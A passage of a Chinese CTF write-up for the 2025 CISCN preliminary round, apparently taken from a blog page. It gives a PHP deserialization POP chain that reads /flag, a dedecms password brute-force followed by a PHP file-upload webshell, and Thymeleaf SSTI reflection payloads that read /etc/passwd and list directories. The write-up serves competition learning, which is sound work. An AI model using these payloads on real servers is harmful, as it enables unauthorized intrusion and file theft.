+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$worker</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$cmd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">worker</span><span class="o">-&gt;</span><span class="na">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">C</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$cmd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="mi">3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">A</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">handle</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">B</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">handle</span><span class="o">-&gt;</span><span class="na">worker</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">C</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">handle</span><span class="o">-&gt;</span><span class="na">worker</span><span class="o">-&gt;</span><span class="na">cmd</span> <span class="o">=</span> <span class="s2">&#34;/flag&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228121031595.png"
+	width="1732"
+	height="763"
+	srcset="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228121031595_hu_b535dc42546f8953.png 480w, /p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228121031595_hu_e4d8117d74e7c7ee.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251228121031595"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="226"
+		data-flex-basis="544px"
+	
+></p>
+<h2 id="dedecms">dedecms
+</h2><img src="image-20251228132139128.png" alt="image-20251228132139128" style="zoom:50%;" />
+<img src="image-20251228132247295.png" alt="image-20251228132247295" style="zoom:50%;" />
+<p>想爆破admin发现不行</p>
+<img src="image-20251228132734667.png" alt="image-20251228132734667" style="zoom:50%;" />
+<p>爆破Aa123456789试试，成功爆破</p>
+<img src="image-20251228132930791.png" alt="image-20251228132930791" style="zoom:50%;" />
+<p>但是不准从前台登入，从/dede/login.php登入后台</p>
+<p><img src="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228133251242.png"
+	width="1742"
+	height="643"
+	srcset="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228133251242_hu_f8c2948c4672b3ed.png 480w, /p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228133251242_hu_79502d9d96b6322d.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251228133251242"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="270"
+		data-flex-basis="650px"
+	
+></p>
+<p>文件上传图片改后缀为php</p>
+<img src="image-20251228134335336.png" alt="image-20251228134335336" style="zoom:50%;" />
+<p>然后访问uploads/allimg/251228/2-25122Q343120-L.php执行命令即可</p>
+<p><img src="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228134701078.png"
+	width="1885"
+	height="363"
+	srcset="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228134701078_hu_5f1f6f100d63514a.png 480w, /p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228134701078_hu_4ad220570d8ddb45.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251228134701078"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="519"
+		data-flex-basis="1246px"
+	
+></p>
+<h2 id="ezjava">EzJava
+</h2><h3 id="考点thymeleaf渲染之读文件">考点：Thymeleaf渲染之读文件
+</h3><p>java且是模板渲染，试试发现是<strong>Thymeleaf</strong>渲染</p>
+<p><a class="link" href="https://www.cnblogs.com/kudo4869/p/18981179#thymeleaf"  target="_blank" rel="noopener"
+    >Java SSTI注入学习 - kudo4869 - 博客园</a></p>
+<p><img src="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228143543699.png"
+	width="1702"
+	height="845"
+	srcset="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228143543699_hu_62e40721b55e99e4.png 480w, /p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228143543699_hu_4a2af1e167558119.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251228143543699"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="201"
+		data-flex-basis="483px"
+	
+></p>
+<p><code>Thymeleaf</code>提供了一些内置标签，通过标签来实现特定的功能</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;h1 th:text=&#34;${2*2}&#34;&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20251228185516938.png" alt="image-20251228185516938" style="zoom:50%;" />
+<p>测试发现T(&hellip;)，new过滤，那只能反射发送，利用 <strong>Java 反射</strong>机制绕过 <code>T(...)</code> 静态类引用过滤，在 Thymeleaf 模板中动态构造调用链执行 <code>Files.readAllLines</code>，从而读取并回显服务器上的 <code>/etc/passwd</code> 文件。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">h1</span><span class="w"> </span><span class="n">th</span><span class="p">:</span><span class="n">text</span><span class="o">=</span><span class="s">&#34;${#strings.listJoin(&#39;&#39;.getClass().forName(&#39;java.nio.file.Files&#39;).getMethod(&#39;readAllLines&#39;, &#39;&#39;.getClass().forName(&#39;java.nio.file.Path&#39;)).invoke(null, &#39;&#39;.getClass().forName(&#39;java.nio.file.Paths&#39;).getMethod(&#39;get&#39;, &#39;&#39;.getClass().forName(&#39;java.net.URI&#39;)).invoke(null, &#39;&#39;.getClass().forName(&#39;java.net.URI&#39;).getMethod(&#39;create&#39;, &#39;&#39;.getClass()).invoke(null, &#39;file:///etc/passwd&#39;))), &#39;,&#39;)}&#34;</span><span class="o">&gt;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228193335355.png"
+	width="1746"
+	height="511"
+	srcset="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228193335355_hu_f2b4e69b2a24ef5d.png 480w, /p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228193335355_hu_f1a2ef74e08c31c.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251228193335355"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="341"
+		data-flex-basis="820px"
+	
+></p>
+<p>通过反射构造指向根目录的 <code>Path</code> 对象，随后将其转为 <code>File</code> 对象并调用 <code>.list()</code>，从而列出根目录下的所有文件名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">h1</span> <span class="nx">th</span><span class="o">:</span><span class="nx">text</span><span class="o">=</span><span class="s2">&#34;${#strings.arrayJoin(&#39;&#39;.getClass().forName(&#39;java.nio.file.Paths&#39;).getMethod(&#39;get&#39;, &#39;&#39;.getClass().forName(&#39;java.net.URI&#39;)).invoke(null, &#39;&#39;.getClass().forName(&#39;java.net.URI&#39;).getMethod(&#39;create&#39;, &#39;&#39;.getClass()).invoke(null, &#39;file:///&#39;)).toFile().list(), &#39;,&#39;)}&#34;</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228195733483.png"
+	width="1850"
+	height="513"
+	srcset="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228195733483_hu_5a76d0f83756e98c.png 480w, /p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228195733483_hu_6f9d56dc9d7fd6ec.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251228195733483"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="360"
+		data-flex-basis="865px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">h1</span> <span class="n">th</span><span class="p">:</span><span class="n">text</span><span class="o">=</span><span class="s2">&#34;${#strings.listJoin(&#39;&#39;.getClass().forName(&#39;java.nio.file.Files&#39;).getMethod(&#39;readAllLines&#39;, &#39;&#39;.getClass().forName(&#39;java.nio.file.Path&#39;)).invoke(null, &#39;&#39;.getClass().forName(&#39;java.nio.file.Paths&#39;).getMethod(&#39;get&#39;, &#39;&#39;.getClass().forName(&#39;java.net.URI&#39;)).invoke(null, &#39;&#39;.getClass().forName(&#39;java.net.URI&#39;).getMethod(&#39;create&#39;, &#39;&#39;.getClass()).invoke(null, #strings.concat(&#39;file:///fl&#39;, &#39;ag_y0u_d0nt_kn0w&#39;)))), &#39;,&#39;)}&#34;</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228195343963.png"
+	width="1768"
+	height="516"
+	srcset="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228195343963_hu_cc3f5dbe0694a470.png 480w, /p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228195343963_hu_7f9ae8976e37216c.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251228195343963"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="342"
+		data-flex-basis="822px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/emo/">Emo</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>谢谢观看</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/2022vnctf%E5%A4%8D%E7%8E%B0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2022vnctf复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2025-%E9%B9%8F%E7%A8%8B%E6%9D%AF/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-鹏程杯</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2025%E9%A2%86%E8%88%AA%E6%9D%AF-awdp/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025领航杯-awdp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/buu-awdp/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">buu-awdp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E9%9D%A2%E7%BB%8F/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">面经</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src="https://utteranc.es/client.js" 
+        repo=""
+        issue-term="pathname"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 luokaihong
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
